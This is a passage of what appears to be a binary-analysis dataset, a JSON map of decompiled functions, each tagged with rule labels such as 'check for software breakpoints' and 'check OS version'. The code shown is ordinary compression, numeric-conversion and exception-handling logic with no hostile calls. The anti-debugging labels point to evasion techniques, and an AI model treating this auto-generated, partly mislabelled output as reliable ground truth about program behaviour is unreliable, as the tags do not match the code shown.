1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 0, 0, 1);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 0, 0, 1);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 0, arg_ch, 1, 1, 0);\n    fcn.0041dc20(arg_8h, 0, arg_ch, 1, 1, 1);\n    fcn.0041dc20(arg_8h, 0, arg_ch, 1, 1, 1);\n    fcn.0041dc20(arg_8h, 0, arg_ch, 1, 1, 1);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 1, 1);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 1, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 0, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 0, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 0, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 0, arg_ch, 1, 0, 0);\n    fcn.0041dc20(arg_8h, 0, arg_ch, 1, 0, 0);\n    return;\n}\n",
        "token_count": 1919
    },
    "00429500": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429500(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    fcn.004292d0(in_EAX);\n    fcn.004292d0(in_EAX);\n    fcn.004290e0(in_EAX + 0xfc8);\n    iVar1 = 0x12;\n    do {\n        if (*(in_EAX + 0xef6 + *(iVar1 + 0x44c994) * 4) != 0) {\ncode_r0x004295bb:\n            *(in_EAX + 0x1af3c) = *(in_EAX + 0x1af3c) + iVar1 * 3 + 0x11;\n            return;\n        }\n        if (*(in_EAX + 0xef6 + *(iVar1 + 0x44c993) * 4) != 0) {\n            *(in_EAX + 0x1af3c) = *(in_EAX + 0x1af3c) + (iVar1 + -1) * 3 + 0x11;\n            return;\n        }\n        if (*(in_EAX + 0xef6 + *(iVar1 + 0x44c992) * 4) != 0) {\n            *(in_EAX + 0x1af3c) = *(in_EAX + 0x1af3c) + (iVar1 + -2) * 3 + 0x11;\n            return;\n        }\n        if (*(in_EAX + 0xef6 + *(iVar1 + 0x44c991) * 4) != 0) {\n            iVar1 = iVar1 + -3;\n            goto code_r0x004295bb;\n        }\n        iVar1 = iVar1 + -4;\n        if (iVar1 < 3) {\n            *(in_EAX + 0x1af3c) = *(in_EAX + 0x1af3c) + iVar1 * 3 + 0x11;\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 455
    },
    "0042a210": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a210(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    *(in_EAX + 0x6af80) = 2;\n    if (*(in_EAX + 0x6af90) != 0) {\n        uVar3 = 0;\n        do {\n            if (2 < *(in_EAX + 0x6af90)) {\n                uVar1 = (*(*(in_EAX + 0x6af84) + 0x1af72 + in_EAX) ^ *(in_EAX + 0x6af7c) << 5) & 0x7fff;\n                *(in_EAX + 0x6af7c) = uVar1;\n                var_4h = *(in_EAX + 0x4af70 + uVar1 * 4);\n                *(in_EAX + 0x2af70 + (*(in_EAX + 0x6af84) & 0x7fff) * 4) = var_4h;\n                *(in_EAX + 0x4af70 + *(in_EAX + 0x6af7c) * 4) = *(in_EAX + 0x6af84);\n            }\n            if ((var_4h != 0) && (*(in_EAX + 0x6af84) - var_4h < 0x7efb)) {\n                uVar3 = *(in_EAX + 0x6af90);\n                if (uVar3 <= *(in_EAX + 0x6afa0) && *(in_EAX + 0x6afa0) != uVar3) {\n                    *(in_EAX + 0x6afa0) = uVar3;\n                }\n                uVar3 = fcn.00429f80();\n                if (*(in_EAX + 0x6af90) < uVar3) {\n                    uVar3 = *(in_EAX + 0x6af90);\n                }\n            }\n            if (uVar3 < 3) {\n                iVar2 = fcn.00429800();\n                *(in_EAX + 0x6af90) = *(in_EAX + 0x6af90) + -1;\n                *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + 1;\n            }\n            else {\n                iVar2 = fcn.00429800();\n                *(in_EAX + 0x6af90) = *(in_EAX + 0x6af90) - uVar3;\n                if ((uVar3 < *(in_EAX + 0x6af98) || uVar3 == *(in_EAX + 0x6af98)) && (2 < *(in_EAX + 0x6af90))) {\n                    uVar3 = uVar3 - 1;\n                    do {\n                        *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + 1;\n                        uVar1 = (*(in_EAX + 0x1af72 + *(in_EAX + 0x6af84)) ^ *(in_EAX + 0x6af7c) << 5) & 0x7fff;\n                        *(in_EAX + 0x6af7c) = uVar1;\n                        var_4h = *(in_EAX + 0x4af70 + uVar1 * 4);\n                        uVar3 = uVar3 - 1;\n                        *(in_EAX + 0x2af70 + (*(in_EAX + 0x6af84) & 0x7fff) * 4) = var_4h;\n                        *(in_EAX + 0x4af70 + *(in_EAX + 0x6af7c) * 4) = *(in_EAX + 0x6af84);\n                    } while (uVar3 != 0);\n                    *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + 1;\n                }\n                else {\n                    *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + uVar3;\n                    uVar1 = *(*(in_EAX + 0x6af84) + 0x1af70 + in_EAX);\n                    *(in_EAX + 0x6af7c) = uVar1;\n                    uVar3 = 0;\n                    *(in_EAX + 0x6af7c) = *(*(in_EAX + 0x6af84) + 0x1af71 + in_EAX) ^ uVar1 << 5;\n                }\n            }\n            if (iVar2 != 0) {\n                if (*(in_EAX + 0x6af74) < 0) {\n                    iVar2 = 0;\n                }\n                else {\n                    iVar2 = *(in_EAX + 0x6af74) + 0x1af70 + in_EAX;\n                }\n                fcn.00429660(iVar2);\n                *(in_EAX + 0x6af74) = *(in_EAX + 0x6af84);\n            }\n            if (*(in_EAX + 0x6af90) < 0x106) {\n                fcn.0042a0d0();\n            }\n        } while (*(in_EAX + 0x6af90) != 0);\n    }\n    if (*(in_EAX + 0x6af74) < 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = *(in_EAX + 0x6af74) + 0x1af70 + in_EAX;\n    }\n    fcn.00429660(iVar2);\n    return;\n}\n",
        "token_count": 1336
    },
    "0042a470": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a470(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t in_EAX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    bVar3 = false;\n    uVar7 = 2;\n    if (*(in_EAX + 4) < 4) {\n        fcn.0042a210();\n        return;\n    }\n    if (*(in_EAX + 0x6af90) != 0) {\n        do {\n            if (2 < *(in_EAX + 0x6af90)) {\n                uVar4 = (*(*(in_EAX + 0x6af84) + 0x1af72 + in_EAX) ^ *(in_EAX + 0x6af7c) << 5) & 0x7fff;\n                *(in_EAX + 0x6af7c) = uVar4;\n                var_8h = *(in_EAX + 0x4af70 + uVar4 * 4);\n                *(in_EAX + 0x2af70 + (*(in_EAX + 0x6af84) & 0x7fff) * 4) = var_8h;\n                *(in_EAX + 0x4af70 + *(in_EAX + 0x6af7c) * 4) = *(in_EAX + 0x6af84);\n            }\n            *(in_EAX + 0x6af80) = uVar7;\n            uVar7 = 2;\n            if (((var_8h != 0) && (*(in_EAX + 0x6af80) < *(in_EAX + 0x6af98))) &&\n               (*(in_EAX + 0x6af84) - var_8h < 0x7efb)) {\n                uVar7 = *(in_EAX + 0x6af90);\n                if (uVar7 <= *(in_EAX + 0x6afa0) && *(in_EAX + 0x6afa0) != uVar7) {\n                    *(in_EAX + 0x6afa0) = uVar7;\n                }\n                uVar7 = fcn.00429f80();\n                if (*(in_EAX + 0x6af90) < uVar7) {\n                    uVar7 = *(in_EAX + 0x6af90);\n                }\n                if ((uVar7 == 3) && (0x1000 < *(in_EAX + 0x6af84) - *(in_EAX + 0x6af88))) {\n                    uVar7 = 2;\n                }\n            }\n            if ((*(in_EAX + 0x6af80) < 3) || (*(in_EAX + 0x6af80) < uVar7)) {\n                if (bVar3) {\n                    iVar6 = fcn.00429800();\n                    if (iVar6 != 0) {\n                        if (*(in_EAX + 0x6af74) < 0) {\n                            iVar6 = 0;\n                        }\n                        else {\n                            iVar6 = *(in_EAX + 0x6af74) + 0x1af70 + in_EAX;\n                        }\n                        fcn.00429660(iVar6);\n                        *(in_EAX + 0x6af74) = *(in_EAX + 0x6af84);\n                    }\n                    *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + 1;\n                }\n                else {\n                    *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + 1;\n                    bVar3 = true;\n                }\n                *(in_EAX + 0x6af90) = *(in_EAX + 0x6af90) + -1;\n            }\n            else {\n                iVar6 = *(in_EAX + 0x6af84);\n                iVar2 = *(in_EAX + 0x6af90);\n                iVar5 = fcn.00429800();\n                *(in_EAX + 0x6af90) = *(in_EAX + 0x6af90) + (1 - *(in_EAX + 0x6af80));\n                *(in_EAX + 0x6af80) = *(in_EAX + 0x6af80) + -2;\n                do {\n                    *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + 1;\n                    uVar7 = *(in_EAX + 0x6af84);\n                    if (uVar7 <= iVar6 + -3 + iVar2) {\n                        uVar4 = (*(uVar7 + 0x1af72 + in_EAX) ^ *(in_EAX + 0x6af7c) << 5) & 0x7fff;\n                        *(in_EAX + 0x6af7c) = uVar4;\n                        var_8h = *(in_EAX + 0x4af70 + uVar4 * 4);\n                        *(in_EAX + 0x2af70 + (uVar7 & 0x7fff) * 4) = var_8h;\n                        *(in_EAX + 0x4af70 + *(in_EAX + 0x6af7c) * 4) = *(in_EAX + 0x6af84);\n                    }\n                    piVar1 = in_EAX + 0x6af80;\n                    *piVar1 = *piVar1 + -1;\n                } while (*piVar1 != 0);\n                *(in_EAX + 0x6af84) = *(in_EAX + 0x6af84) + 1;\n                iVar6 = 0;\n                bVar3 = false;\n                uVar7 = 2;\n                if (iVar5 != 0) {\n                    if (-1 < *(in_EAX + 0x6af74)) {\n                        iVar6 = *(in_EAX + 0x6af74) + 0x1af70 + in_EAX;\n                    }\n                    fcn.00429660(iVar6);\n                    *(in_EAX + 0x6af74) = *(in_EAX + 0x6af84);\n                    uVar7 = 2;\n                }\n            }\n            if (*(in_EAX + 0x6af90) < 0x106) {\n                fcn.0042a0d0();\n            }\n        } while (*(in_EAX + 0x6af90) != 0);\n        if (bVar3) {\n            fcn.00429800();\n        }\n    }\n    if (*(in_EAX + 0x6af74) < 0) {\n        iVar6 = 0;\n    }\n    else {\n        iVar6 = *(in_EAX + 0x6af74) + 0x1af70 + in_EAX;\n    }\n    fcn.00429660(iVar6);\n    return;\n}\n",
        "token_count": 1617
    },
    "00431be6": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00431be6(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.0042fd93(*(unaff_EBP + -0x28));\n    iVar1 = fcn.0043493b();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.0043493b();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.0042fd6c(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0043196d(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 383
    },
    "0043f04e": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0043f04e(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = str.5_v_[1];\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = str.5_v_[0] + L'\\xffffffff';\n        iVar14 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0043f192;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0043f199;\ncode_r0x0043f192:\n                        do {\n                            bVar6 = true;\ncode_r0x0043f199:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0043f1a7;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0043f1a7:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x4557b4 - str.5_v_[0]) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x4557b4 < iVar14) {\n                if (iVar14 < *0x4557b0) {\n                    iVar14 = iVar14 + str.5_v_[3];\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = str.5_v_[3] + *0x4557b0;\n                }\n                goto code_r0x0043f552;\n            }\n            iVar13 = *0x4557b4 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = str.5_v_[0] + L'\\xffffffff';\n            iVar13 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0043f346;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0043f346:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = str.5_v_[1] + L'\\x01' + (str.5_v_[1] + L'\\x01' >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0043f552:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = uVar15;\n    }\n    fcn.0042d636(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3270
    },
    "0043f59f": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0043f59f(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x4557d4;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x4557d0 + -1;\n        iVar14 = *0x4557d0 + (*0x4557d0 >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (*0x4557d0 & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0043f6e3;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0043f6ea;\ncode_r0x0043f6e3:\n                        do {\n                            bVar6 = true;\ncode_r0x0043f6ea:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0043f6f8;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0043f6f8:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x4557cc - *0x4557d0) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x4557cc < iVar14) {\n                if (iVar14 < *0x4557c8) {\n                    iVar14 = iVar14 + *0x4557dc;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x4557d4 + (*0x4557d4 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x4557d4 + (*0x4557d4 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] 